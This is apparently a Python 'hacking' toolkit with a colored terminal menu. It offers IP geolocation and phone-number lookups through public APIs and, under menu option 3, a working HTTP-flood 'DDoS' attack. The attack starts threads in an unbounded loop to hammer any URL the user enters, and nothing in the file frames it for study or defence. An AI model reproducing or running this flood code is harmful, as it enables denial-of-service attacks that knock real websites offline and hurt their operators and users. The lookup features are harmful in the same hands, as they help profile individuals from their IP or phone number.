import socket
import validators
import requests
import threading
import time
import phonenumbers
from phonenumbers import geocoder, carrier, timezone

def make_request(url):
    response = requests.get(url)
    print('[+] DDoS Status:',response.status_code)

def analyze_phone_number(phone_number, numverify_api_key):
    try:
        parsed_number = phonenumbers.parse(phone_number, None)
        country = geocoder.description_for_number(parsed_number, "en")
        operator = carrier.name_for_number(parsed_number, "en")
        time_zone = timezone.time_zones_for_number(parsed_number)
        is_valid = phonenumbers.is_valid_number(parsed_number)
        number_type = phonenumbers.number_type(parsed_number)

        print(f'''
╔══════════════                     ══════════════╗
    
    [+] Phone number: {phone_number}
    
    [+] Country: {country}
    [+] Time Zone(s): {time_zone}
        
    [+] Operator: {operator}
        
    [+] Valid: {is_valid}
    [+] Number Type: {number_type}
        
╚══════════════                     ══════════════╝
''')

        # Requesting additional data from NumVerify
        numverify_url = f'http://apilayer.net/api/validate?access_key={numverify_api_key}&number={phone_number}&country_code=&format=1'
        response = requests.get(numverify_url)
        data = response.json()

        if data['valid']:
            print(f'''
╔══════════════                     ══════════════╗
    
    [+] Info from NumVerify:
    
    [+] Country Prefix: {data['country_prefix']}
    
    [+] Country Code: {data['country_code']}
    [+] Location: {data['location']}
    
    [+] Carrier: {data['carrier']}
    
    [+] Line Type: {data['line_type']}
        
╚══════════════                     ══════════════╝
''')
        else:
            print("The provided phone number is not valid.")
    except (phonenumbers.phonenumberutil.NumberParseException, requests.RequestException) as e:
        print("Error:", e)


def get_ip():
    ip = input(f'[-] Type IP: ')

    try:
        ip = socket.gethostbyname(ip)
        
        infoList1 = requests.get(f"http://ipwho.is/{ip}")
        infoList = infoList1.json()
        
        if infoList.get("success"):
            print(f'''
╔══════════════                     ══════════════╗
    
    [+] IP: {infoList["ip"]}
    [+] Status: {infoList["success"]}
    [+] Type: {infoList["type"]}
        
    [+] Continent: {infoList["continent"]}
    [+] Country: {infoList["country"]}
    [+] Capital: {infoList["capital"]}
    [+] Region: {infoList["region"]}
    [+] City: {infoList["city"]}
        
    [+] Postal Code: {infoList["postal"]}
    [+] Capital: {infoList["capital"]}
        
    [+] Location: {infoList["latitude"]} {infoList["longitude"]}
        
╚══════════════                     ══════════════╝
''')
        else:
            print(f'''
╔══════════════                     ══════════════╗
    
    [+] IP: {infoList["ip"]}

    [+] Success: {infoList["success"]}
    [+] Message: {infoList["message"]}
        
╚══════════════                     ══════════════╝
''')
    except Exception as e:
        print(f'Error: {e}')
        
import os
from pystyle import Colorate, Colors

while True:
    os.system('cls' if os.name == 'nt' else 'clear')

    for _ in range(4):
        print()

    from banner import banner
    print(Colorate.Horizontal(Colors.red_to_blue, banner.strip()))

    COLOR_CODE = {
        "BOLD": "\033[01m",
        "RED": "\033[31m",
        "RESET": "\033[0m",
    }

    prompt_text = f'\n{COLOR_CODE["RED"]}[-]{COLOR_CODE["BOLD"]} Select ~> '

    select = input(prompt_text)

    if select == '1':
        get_ip()
        input("Press ENTER, to continue")
    elif select == "2":
        phone_input = input("[+] Type Number: ")
        numverify_api_key = input("[+] Type NumVerify API Key: ")
        analyze_phone_number(phone_input, numverify_api_key)
        input("[-] Press ENTER, to continue")
    elif select == "3":
        url = input("[+] Type site's URL:")
        if not validators.url(url):
            print("[!] Incorrect URL!")
        else:
            print("[+] Attack started!")
            while True:
                t = threading.Thread(target=make_request, args=(url,))
                t.start()
    elif select == "4":
        print('\nby @illiagg3 <- banned')
        print('github: https://github.com/Illiagg')
        print('version: 0.1')
        print('NumVerify (api key): https://numverify.com/dashboard')
        print('')
        input("[-] Press ENTER, to continue")

    else:
        print(f'{COLOR_CODE["RED"]}[!] Try again!{COLOR_CODE["RESET"]}')
